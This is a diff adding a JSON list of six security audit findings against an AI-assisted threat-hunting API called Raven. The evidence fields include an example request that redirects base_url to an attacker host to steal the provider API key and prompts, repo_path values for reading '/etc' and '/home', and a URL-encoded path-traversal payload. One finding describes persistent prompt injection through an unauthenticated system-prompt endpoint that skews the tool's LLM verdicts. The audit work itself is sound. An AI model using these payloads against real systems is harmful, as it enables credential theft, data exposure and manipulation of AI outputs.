@@ -1,0 +1,82 @@
+{
+    "findings": [
+        {
+            "title": "Unauthenticated /ai/provider allows base_url override that exfiltrates provider API key and all prompts to attacker URL",
+            "severity": "critical",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/api/main.py",
+            "evidence": "POST /ai/provider {\"provider\":\"openai\",\"base_url\":\"http://attacker.example.com/v1\"} reaches ProviderRegistry.switch() (raven/ai/registry.py); the switch retains the previously-loaded api_key when the request omits one (api_key=api_key or self._config.api_key) and rebuilds the client against the attacker base_url. The next analyze/hypothesis/chat call sends Authorization: Bearer <real-key> plus full prompt content to the attacker host. No auth dependency on the route.",
+            "attacker": "unauthenticated network client reachable to API port",
+            "input": "JSON body field base_url",
+            "impact": "API key theft, complete prompt/code exfiltration, attacker controls AI responses returned to Raven hunters/orchestrator"
+        },
+        {
+            "title": "Unauthenticated /hunt/code and /hunt/variant accept arbitrary repo_path enabling remote filesystem read",
+            "severity": "high",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/api/main.py",
+            "evidence": "POST /hunt/variant {\"repo_path\":\"/etc\"} and POST /hunt/code {\"repo_path\":\"/home\"} have no path validation and no auth. variant_analyzer._scan_dangerous_patterns and code_flow_scanner.scan_repository walk repo_path recursively and return findings with file paths plus evidence strings (line content, up to 200 chars per match) drawn from any .py/.c/.cpp/.h file the server process can read. Attacker enumerates filesystem layout, harvests hardcoded secrets and source code outside intended scope.",
+            "attacker": "unauthenticated network client",
+            "input": "JSON body field repo_path",
+            "impact": "Arbitrary directory enumeration and partial content disclosure for code files anywhere readable by the server, including hardcoded credentials, private keys in script form, internal source code"
+        },
+        {
+            "title": "Unauthenticated /ai/system-prompt enables persistent prompt injection of all subsequent AI calls",
+            "severity": "high",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/api/main.py",
+            "evidence": "POST /ai/system-prompt {\"prompt\":\"...\"} writes ProviderRegistry.set_system_prompt(prompt) with no auth. After d3d2fbb fix, BaseAIClient._build_messages auto-injects the stored prompt into every provider chat() call whose first message is not already a system role. ModelOrchestrator.chat and any external chat-only consumer are affected. The prompt persists in ProviderConfig and survives profile save/load.",
+            "attacker": "unauthenticated network client",
+            "input": "JSON body field prompt",
+            "impact": "Manipulate AI verdicts in threat hunting, hypothesis generation routed through ModelOrchestrator, and any downstream automation consuming AI output as ground truth"
+        },
+        {
+            "title": "All /ai/* mutation endpoints have no authentication dependency",
+            "severity": "high",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/api/main.py",
+            "evidence": "Routes /ai/provider POST, /ai/model POST, /ai/system-prompt POST/DELETE, /ai/provider/profiles/{name} POST/PUT/DELETE, /ai/models/load POST, /ai/models/unload POST are declared without Depends(...) auth guards. No global authentication middleware is installed. CORSMiddleware allow_origins=['*'] additionally exposes these to cross-origin browser pivots.",
+            "attacker": "anyone reachable over network or via a victim browser tab",
+            "input": "any /ai/* HTTP request",
+            "impact": "Enabling primitive for credential exfiltration (base_url swap), prompt injection, model load/unload denial of service, profile poisoning"
+        },
+        {
+            "title": "Profile name path traversal in /ai/provider/profiles/{name} writes API keys outside profiles directory",
+            "severity": "medium",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/ai/registry.py",
+            "evidence": "save_profile(name) builds path as _PROFILES_DIR / f'{name}.json' with no validation. A URL-encoded path-segment value like %2E%2E%2Fpoisoned (..%2Fpoisoned) decodes to '../poisoned'; Path division does not constrain to parent directory and resolves to ~/.raven/poisoned.json. The written JSON contains api_key, base_url, model, and system_prompt. Combined with the unauthenticated PUT /ai/provider/profiles/{name} load endpoint, attacker can persist and activate a fully attacker-controlled provider config.",
+            "attacker": "unauthenticated network client",
+            "input": "URL path segment {name} in POST /ai/provider/profiles/{name}",
+            "impact": "Write attacker-controlled JSON (containing live API key) to arbitrary location inside ~/.raven; persistence primitive that chains with the base_url exfil finding"
+        },
+        {
+            "title": "SSHManager uses paramiko AutoAddPolicy which silently trusts new host keys and enables MITM",
+            "severity": "medium",
+            "status": "active",
+            "commit_hash": "d3d2fbb31c411ce821d3e2d65adf0c5bbbd7dd8d",
+            "detected_at_pst": "2026-05-13T09:28:00-07:00",
+            "reported_link": "",
+            "location": "raven/tools/ssh_manager.py",
+            "evidence": "client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) in SSHManager.connect accepts any presented host key without verification. AutomatedInvestigator routes investigation commands through SSHManager.execute_command for hardcoded forensic commands; an on-path attacker can impersonate the investigated host, capture password auth credentials, and return crafted output that misleads HypothesisGenerator and KillChainPlanner LLM verdicts.",
+            "attacker": "network-position attacker between Raven and the SSH target",
+            "input": "TCP path during SSH handshake to a host newly added via SSHManager.connect",
+            "impact": "Credential theft for password-auth flows, command interception, attacker-controlled forensic evidence fed back into LLM-driven hunting decisions"
+        }
+    ]
+}
